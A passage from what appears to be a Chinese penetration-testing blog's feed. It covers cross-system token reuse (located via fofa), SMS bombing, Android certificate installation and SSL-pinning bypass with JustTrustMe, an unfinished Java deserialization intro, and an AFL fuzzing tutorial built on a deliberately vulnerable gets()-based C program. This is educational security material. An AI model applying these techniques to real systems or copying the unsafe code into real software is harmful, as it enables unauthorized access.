title="Cookie通用问题"></a>Cookie通用问题</h3><p>最近遇到的比较多的还有撞库问题，即A目标单位部署了某X业务系统，在B非目标单位中找到与A单位相同的X业务系统，B单位的X系统存在弱密码，因此可以直接获取access_token，将B单位X系统的Token用在A单位的X业务系统中可以直接登录A单位的X系统，这种情况是因为同一个业务系统的Token生成流程完全一致，举个例子，B单位的管理员账号名为admin，其access_token生成逻辑为md5(“username”)，当A单位的管理员用户名也为admin时则md5()函数的返回值与B单位业务系统代码的返回值完全一致，因此导致Cookie信息可以“一次获取，多系统登录”。</p><p>个人感觉这样的漏洞在认证环节复杂的系统上更容易出现，尤其是免密登录的SSO场景，其生成的Token为了保证减少服务器负担，可能只有一次校验逻辑，即校验用户名与Token是否匹配，而不会校验用户名和密码的组合与Token是否匹配，因为这里存在一个惯性逻辑问题即用户拿着Token来进行认证的时候服务器假定用户已经通过了用户名＋密码的验证逻辑，因此在SSO登录时就不校验密码了，导致Token生成算法一致的两个系统中存在相同用户名的用户认证信息完全一致的情况。</p><p>在实际攻击场景中，如果某业务系统迟迟拿不下来可以通过fofa搜索相同的系统，即使这个系统的Cookie无法复用也可以找一些未授权访问的接口来做进一步的信息收集，不过这种方法严格意义上不符合渗透规范，容易被请去喝茶，所以还是慎用。</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>验证码发送过程中也有较大概率存在短信轰炸的问题，攻击者可以不断请求短信发送接口，受害者就会被短信轰炸。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>逻辑漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安卓APP抓包教程</title>
    <link href="/2020/12/%E5%AE%89%E5%8D%93APP%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B/"/>
    <url>/2020/12/%E5%AE%89%E5%8D%93APP%E6%8A%93%E5%8C%85%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h3 id="安卓APP抓包"><a href="#安卓APP抓包" class="headerlink" title="安卓APP抓包"></a>安卓APP抓包</h3><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>在渗透测试项目中，有很多目标单位有专属的APP，其中APP自身安全和APP对应的服务端接口也是渗透测试的攻击面，但是现有的APP安全防护措施不断提高，从APP本身发现安全问题的可能性降低，且服务器与客户端的通信过程也有较多的安全校验，下文将介绍安卓APP的抓包方法，方便渗透测试过程中的漏洞挖掘。</p><span id="more"></span><h4 id="证书校验"><a href="#证书校验" class="headerlink" title="证书校验"></a>证书校验</h4><p>现在很多APP的网络请求都使用HTTPS，HTTP报文可以很轻松的通过在手机上设置代理然后通过BurpSuite等报文嗅探、代理软件截获，便于后续分析，但是HTTPS报文传输过程需要证书认证，现有多数APP还有双向认证机制，即不仅服务器要校验请求是否来源于真正的客户端，客户端也会校验收到的信息是否来自于服务器，而且安卓7.0之后，APP只会识别系统级别的证书，而从BurpSuite和Charles中导出安装的证书是用户级证书，因此导致在转包软件中无法抓到相应APP的流量数据，因此有两种方法可以安装:</p><ul><li>获取Root权限，然后将抓包软件的证书安装为系统级证书</li></ul><p>使用ADB安装证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1.从Charles取出证书</span><br><br>charles-proxy-ssl-proxying-certificate.pem<br><span class="hljs-comment"># 2.获取证书hash，并修改证书文件名为hash+后缀&#x27;&#x27;.0&#x27;&#x27; 。本例为fc0dd2c8.0</span><br><br>iMac:~ imac$ openssl x509 -<span class="hljs-keyword">in</span> ./charles-proxy-ssl-proxying-certificate.pem   -noout -subject_hash<br><br><span class="hljs-comment"># 执行结果：fc0dd2c8</span><br><span class="hljs-comment"># 3.连接测试机，adb shell 修改 /system权限，</span><br>adb push fc0dd2c8.0 证书到 /system/etc/security/cacerts/<br><br>mount -o rw,remount /system<br><span class="hljs-comment"># 4.修改证书权限为664，重启设备</span><br><br><span class="hljs-built_in">cd</span> /system/etc/security/cacerts/<br><br><span class="hljs-built_in">chmod</span> 664 ./fc0dd2c8.0<br><br>reboot<br></code></pre></td></tr></table></figure><ul><li>修改APP包Androidmanifest，文件并将APP重新打包</li></ul><h4 id="APP校验证书"><a href="#APP校验证书" class="headerlink" title="APP校验证书"></a>APP校验证书</h4><p>有些APP会有SSL pinning通过APP自身代码校验证书和服务器的关系，这种情况下使用自己导出的证书无法通过此步认证，可以通过逆向APP将APP验证的证书提取出来，证书通常在&#x2F;assets目录下，通过jeb等反编译工具全局搜索cer、p12、pem、ssl等关键字可以找到相应证书未知，将证书导出并导入到抓包程序内即可，如下如是某APP内证书存放位置：</p><p><img src="https://i.loli.net/2021/02/09/tHYfqAaXJS4uBZO.png" alt="JEB界面"></p><h4 id="模拟器抓包"><a href="#模拟器抓包" class="headerlink" title="模拟器抓包"></a>模拟器抓包</h4><p>可能为了更方便的实现模拟器自身的功能，目前市面上多款模拟器的安卓版本多为安卓6，因此在抓包就相对容易一些，首先在模拟器中安装Xposed框架，然后在框架中安装JustTrustMe模块，安装成功后界面如下：</p><p><img src="https://i.loli.net/2021/02/09/kPeD9Yjtqlf14cB.png" alt="JustTrustMe"></p><p>在模拟器中将系统代理地址设置为Charles地址，默认为本机IP＋8090端口</p><p><img src="https://i.loli.net/2021/02/09/fVQlYm8OJuwZpbq.png" alt="代理修改"></p><p>抓包成功示意图：</p><p><img src="https://i.loli.net/2021/02/09/2B3oEN6x9IbV1Cy.png" alt="抓包"></p><p>对于部分反分析功能比较完善的APP，以上分析方法可能就会失效，比如APP会校验自身运行环境是否已授权Root，如果已授权则禁止运行，或者检测是否安装Xposed这种通常在正常使用环境中不会出现的APP就会退出等，遇到这种APP还是要先通过逆向将检测逻辑给过掉才能继续分析。</p><h4 id="代理APP"><a href="#代理APP" class="headerlink" title="代理APP"></a>代理APP</h4><p>除了以上手机抓包方式，还有一个可以安装在目标安卓系统的一款APP：Packet Capture，此应用通过设置系统代理的方式截获其他APP的数据包，也可以对一些没有双向认证的APP进行简单地分析。</p><p>软件界面：</p><p><img src="https://i.loli.net/2021/02/09/bnjCSdK4y3kHthq.png" alt="抓包"></p><p>抓包界面：</p><p><img src="https://i.loli.net/2021/02/09/DGOM5CZ6du1mS2z.png" alt="数据包内容"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>以上方法可以实现安卓客户端流量抓取，方便渗透测试过程中发现更多渗透入口。</p><p><a href="https://www.yuanrenxue.com/app-crawl/android-7-capture-data.html">参考文章</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
      <tag>安卓</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化漏洞分析</title>
    <link href="/2020/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    <url>/2020/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>序列化与反序列化简介</p><blockquote><p>Java 提供了一种对象序列化的机制，该机制中，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。</p><p>将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中新建对象。</p><p>整个过程都是 Java 虚拟机（JVM）独立的，也就是说，在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象。</p><p>类 ObjectInputStream 和 ObjectOutputStream 是高层次的数据流，它们包含反序列化和序列化对象的方法。</p><p>–<a href="https://www.runoob.com/java/java-serialization.html">https://www.runoob.com/java/java-serialization.html</a></p></blockquote><span id="more"></span><h2 id="序列化与反序列化代码示例"><a href="#序列化与反序列化代码示例" class="headerlink" title="序列化与反序列化代码示例"></a>序列化与反序列化代码示例</h2><p><strong>声明一个类</strong></p><p>下面做代码演示，首先我们声明一个类，一个类想要序列化成功，必须实现java.io.Serializeable接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable&#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> String phoneNumber;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">nameCheck</span><span class="hljs-params">()</span><br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;name is &quot;</span> + name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>序列化</strong></p><p>下面代码完成了类的实例化和序列化到文件的操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//类的实例化</span><br><span class="hljs-type">Employee</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>();<br>e.name = <span class="hljs-string">&quot;Hvnt3r&quot;</span>;<br>e.phoneNumber = <span class="hljs-string">&quot;144413141123&quot;</span>;<br><br><span class="hljs-comment">//类的序列化</span><br><span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./test.ser&quot;</span>);<br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fileOutputStream);<br>outputStream.writeObject(e);<br>outputStream.close();<br>fileOutputStream.close();<br></code></pre></td></tr></table></figure><p>运行此段代码即可生成一个名为test.ser的二进制文件，此时通过xxd查看test.ser内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs hex">00000000: aced 0005 7372 0013 636f 6d2e 6876 6e74  ....sr..com.hvnt<br>00000010: 3372 2e45 6d70 6c6f 7965 6578 a396 1a12  3r.Employeex....<br>00000020: a6d9 8602 0002 4c00 046e 616d 6574 0012  ......L..namet..<br>00000030: 4c6a 6176 612f 6c61 6e67 2f53 7472 696e  Ljava/lang/Strin<br>00000040: 673b 4c00 0b70 686f 6e65 4e75 6d62 6572  g;L..phoneNumber<br>00000050: 7100 7e00 0178 7074 0006 4876 6e74 3372  q.~..xpt..Hvnt3r<br>00000060: 7400 0c31 3434 3431 3331 3431 3132 33    t..144413141123<br></code></pre></td></tr></table></figure><p><strong>反序列化</strong></p><p>通过objectInputStream.readObject()方法将序列化的文件转化为Employee类的引用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./test.ser&quot;</span>);<br><span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fileInputStream);<br>e = (Employee) objectInputStream.readObject();<br>objectInputStream.close();<br>fileInputStream.close();<br><br>System.out.println(<span class="hljs-string">&quot;Deserialize Employee ...&quot;</span>);<br>System.out.println(<span class="hljs-string">&quot;Name: &quot;</span> + e.name);<br>System.out.println(<span class="hljs-string">&quot;Phone: &quot;</span> + e.phoneNumber);<br></code></pre></td></tr></table></figure><p>代码输出如下：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">Deserialize Employee ...<br><span class="hljs-symbol">Name:</span> Hvnt3r<br><span class="hljs-symbol">Phone:</span> <span class="hljs-number">144413141123</span><br></code></pre></td></tr></table></figure><h2 id="漏洞产生与利用"><a href="#漏洞产生与利用" class="headerlink" title="漏洞产生与利用"></a>漏洞产生与利用</h2><p>未完待续👨‍💻</p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>Java反序列化</tag>
      
      <tag>漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFL初体验</title>
    <link href="/2020/02/AFL%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <url>/2020/02/AFL%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<blockquote><p>AFL全程American Fuzzy Lop，是由安全研究员Michał Zalewski（<a href="https://twitter.com/lcamtuf">@lcamtuf</a>）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。</p></blockquote><h2 id="AFL安装"><a href="#AFL安装" class="headerlink" title="AFL安装"></a>AFL安装</h2><p>AFL在ubuntu下可以直接使用以下指令安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install afl<br></code></pre></td></tr></table></figure><span id="more"></span><h2 id="测试对象生成"><a href="#测试对象生成" class="headerlink" title="测试对象生成"></a>测试对象生成</h2><p>安装完成之后写一个小程序用测试AFL，程序源代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment">gcc -fno-stack-protector -z execstack vuln.c -o vuln</span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> login[<span class="hljs-number">32</span>];<br>    <span class="hljs-type">char</span> password[<span class="hljs-number">32</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Username: \n&quot;</span>);<br>    gets(login);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Password: \n&quot;</span>);<br>    gets(password);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(login, <span class="hljs-string">&quot;root&quot;</span>) == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(password, <span class="hljs-string">&quot;qwer1234&quot;</span>) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Access Granted!\n&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Access Denied.\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>本程序就是一个简单的验证用户名和密码的小程序，本程序根据输入结果有三条执行流：</p><ul><li>用户名错误且密码错误</li><li>用户名正确但密码不正确</li><li>用户名正确且密码正确</li></ul><p>使用afl-gcc编译源代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -fno-stack-protector -z execstack vuln.c -o vuln<br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@e73955bef93e:/pwn/AFL_learning<span class="hljs-comment"># afl-gcc -fno-stack-protector -z execstack vuln.c -o vuln</span><br>afl-cc 2.52b by &lt;lcamtuf@google.com&gt;<br>vuln.c: In <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;main&#x27;</span>:<br>vuln.c:15:5: warning: implicit declaration of <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;gets&#x27;</span>; did you mean <span class="hljs-string">&#x27;fgets&#x27;</span>? [-Wimplicit-function-declaration]<br>     gets(login);<br>     ^~~~<br>     fgets<br>afl-as 2.52b by &lt;lcamtuf@google.com&gt;<br>[+] Instrumented 6 locations (64-bit, non-hardened mode, ratio 100%).<br>/tmp/ccudSZMx.o: In <span class="hljs-keyword">function</span> `main<span class="hljs-string">&#x27;:</span><br><span class="hljs-string">/pwn/AFL_learning/vuln.c:15: warning: the `gets&#x27;</span> <span class="hljs-keyword">function</span> is dangerous and should not be used.<br></code></pre></td></tr></table></figure><p>使用checksec命令的结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@e73955bef93e:/pwn/AFL_learning<span class="hljs-comment"># checksec vuln</span><br>[*] <span class="hljs-string">&#x27;/pwn/AFL_learning/vuln&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      PIE enabled<br>    RWX:      Has RWX segments<br></code></pre></td></tr></table></figure><h2 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h2><p>为了模拟上文提到的程序运行的三条执行流分别对应的结果，创建两个目录分别作为AFL的输入目录和输出目录。比如如下目录结构：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">/AFL_testFolder/<br>       |<span class="hljs-string"></span><br><span class="hljs-string">       </span>|<span class="hljs-string">-------/testcases/----</span>|<br>       |<span class="hljs-string">                      </span>|<span class="hljs-string">test1.txt</span><br><span class="hljs-string">       </span>|<span class="hljs-string">                      </span>|<span class="hljs-string">test2.txt</span><br><span class="hljs-string">       </span>|<span class="hljs-string">                      </span>|<span class="hljs-string">test3.txt</span><br><span class="hljs-string">       </span>|<br>       |<span class="hljs-string">-------/results/</span><br></code></pre></td></tr></table></figure><p>其中testcases中各个文件的文件内容如下：</p><p><strong>test1.txt</strong></p><p><em>模拟用户名和密码都不正确的情况</em></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">aasdqf</span><br><span class="hljs-attribute">sqwdqfs</span><br></code></pre></td></tr></table></figure><p><strong>test2.txt</strong></p><p><em>模拟用户名正确但是密码不正确的情况</em></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">root</span><br><span class="hljs-attribute">asdfasdfasd</span><br></code></pre></td></tr></table></figure><p><strong>text3.txt</strong></p><p><em>模拟用户名和密码都正确的情况</em></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">root</span><br>qwer1234<br></code></pre></td></tr></table></figure><h2 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h2><p>将以上文件布置好之后即可开始fuzzing：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">afl-fuzz -i ./testcases/ -o ./results/ ./vuln<br></code></pre></td></tr></table></figure><p>测试跑起来之后的输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@e73955bef93e:/pwn/AFL_learning<span class="hljs-comment"># afl-fuzz -i ./testcases/ -o ./results/ ./vuln</span><br>afl-fuzz 2.52b by &lt;lcamtuf@google.com&gt;<br>[+] You have 2 CPU cores and 5 runnable tasks (utilization: 250%).<br>[!] WARNING: System under apparent load, performance may be spotty.<br>[*] Checking CPU core loadout...<br>[+] Found a free CPU core, binding to <span class="hljs-comment">#0.</span><br>[*] Checking core_pattern...<br>[*] Setting up output directories...<br>[+] Output directory exists but deemed OK to reuse.<br>[*] Deleting old session data...<br>[+] Output <span class="hljs-built_in">dir</span> cleanup successful.<br>[*] Scanning <span class="hljs-string">&#x27;./testcases/&#x27;</span>...<br>[+] No auto-generated dictionary tokens to reuse.<br>[*] Creating hard links <span class="hljs-keyword">for</span> all input files...<br>[*] Validating target binary...<br>[*] Attempting dry run with <span class="hljs-string">&#x27;id:000000,orig:test1.txt&#x27;</span>...<br>[*] Spinning up the fork server...<br>[+] All right - fork server is up.<br>    len = 11, map size = 3, <span class="hljs-built_in">exec</span> speed = 3453 us<br>[*] Attempting dry run with <span class="hljs-string">&#x27;id:000001,orig:test2.txt&#x27;</span>...<br>    len = 12, map size = 5, <span class="hljs-built_in">exec</span> speed = 3751 us<br>[*] Attempting dry run with <span class="hljs-string">&#x27;id:000002,orig:test3.txt&#x27;</span>...<br>    len = 14, map size = 4, <span class="hljs-built_in">exec</span> speed = 2962 us<br>[+] All <span class="hljs-built_in">test</span> cases processed.<br><br>[+] Here are some useful stats:<br><br>    Test <span class="hljs-keyword">case</span> count : 3 favored, 0 variable, 3 total<br>       Bitmap range : 3 to 5 bits (average: 4.00 bits)<br>        Exec timing : 2962 to 3751 us (average: 3389 us)<br><br>[*] No -t option specified, so I<span class="hljs-string">&#x27;ll use exec timeout of 20 ms.</span><br><span class="hljs-string">[+] All set and ready to roll!</span><br><span class="hljs-string"></span><br><span class="hljs-string">                        american fuzzy lop 2.52b (vuln)</span><br><span class="hljs-string"></span><br><span class="hljs-string">┌─ process timing ─────────────────────────────────────┬─ overall results ─────┐</span><br><span class="hljs-string">│        run time : 0 days, 0 hrs, 0 min, 42 sec       │  cycles done : 5      │</span><br><span class="hljs-string">│   last new path : none yet (odd, check syntax!)      │  total paths : 3      │</span><br><span class="hljs-string">│ last uniq crash : 0 days, 0 hrs, 0 min, 41 sec       │ uniq crashes : 1      │</span><br><span class="hljs-string">│  last uniq hang : none seen yet                      │   uniq hangs : 0      │</span><br><span class="hljs-string">├─ cycle progress ────────────────────┬─ map coverage ─┴───────────────────────┤</span><br><span class="hljs-string">│  now processing : 0 (0.00%)         │    map density : 0.00% / 0.01%         │</span><br><span class="hljs-string">│ paths timed out : 0 (0.00%)         │ count coverage : 1.00 bits/tuple       │</span><br><span class="hljs-string">├─ stage progress ────────────────────┼─ findings in depth ────────────────────┤</span><br><span class="hljs-string">│  now trying : havoc                 │ favored paths : 3 (100.00%)            │</span><br><span class="hljs-string">│ stage execs : 252/256 (98.44%)      │  new edges on : 3 (100.00%)            │</span><br><span class="hljs-string">│ total execs : 16.0k                 │ total crashes : 39 (1 unique)          │</span><br><span class="hljs-string">│  exec speed : 358.2/sec             │  total tmouts : 0 (0 unique)           │</span><br><span class="hljs-string">├─ fuzzing strategy yields ───────────┴───────────────┬─ path geometry ────────┤</span><br><span class="hljs-string">│   bit flips : 0/208, 0/205, 0/199                   │    levels : 1          │</span><br><span class="hljs-string">│  byte flips : 0/26, 0/23, 0/17                      │   pending : 0          │</span><br><span class="hljs-string">│ arithmetics : 0/1451, 0/172, 0/0                    │  pend fav : 0          │</span><br><span class="hljs-string">│  known ints : 0/140, 0/643, 0/748                   │ own finds : 0          │</span><br><span class="hljs-string">│  dictionary : 0/0, 0/0, 0/18                        │  imported : n/a        │</span><br><span class="hljs-string">│       havoc : 1/6144, 0/5760                        │ stability : 100.00%    │</span><br><span class="hljs-string">│        trim : 29.73%/7, 0.00%                       ├────────────────────────┘</span><br><span class="hljs-string">│─────────────────────────────────────────────────────┘          [cpu000:287%]</span><br></code></pre></td></tr></table></figure><p>其中AFL的界面介绍可以在<a href="https://www.freebuf.com/articles/system/191536.html">https://www.freebuf.com/articles/system/191536.html</a>看到，</p><p>在此案例中，可以看到total paths字段的值为3。当所有执行流都执行完之后差不多就可以终止fuzz了，因为再fuzz下去也不会出现什么新的结果了。</p><h2 id="fuzz结果查看"><a href="#fuzz结果查看" class="headerlink" title="fuzz结果查看"></a>fuzz结果查看</h2><p>终止fuzz之后可以在results目录下找到crash记录，通过回放crash可以找到程序的漏洞，比如我fuzz结束后crash目录下有如下文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./results/crash/id:000000,sig:11,src:000000,op:havoc,rep:128<br></code></pre></td></tr></table></figure><p>将此文件输入到文件中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@e73955bef93e:/pwn/AFL_learning<span class="hljs-comment"># ./vuln  &lt; ./results/crashes/id\:000000\,sig\:11\,src\:000000\,op\:havoc\,rep\:128</span><br>Login:<br>Password:<br>Access Denied.<br>Segmentation fault<br></code></pre></td></tr></table></figure><p>就可以还原crash的情况了，比如这里发现了一个Segmentation fault。</p><blockquote><p>关于fuzz测试还有很多要学的，好好加油吧。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>二进制安全</tag>
      
      <tag>IoT</tag>
      
      <tag>模糊测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>中国蚁剑</title>
    <link href="/2020/02/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/"/>
    <url>/2020/02/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/</url>
    
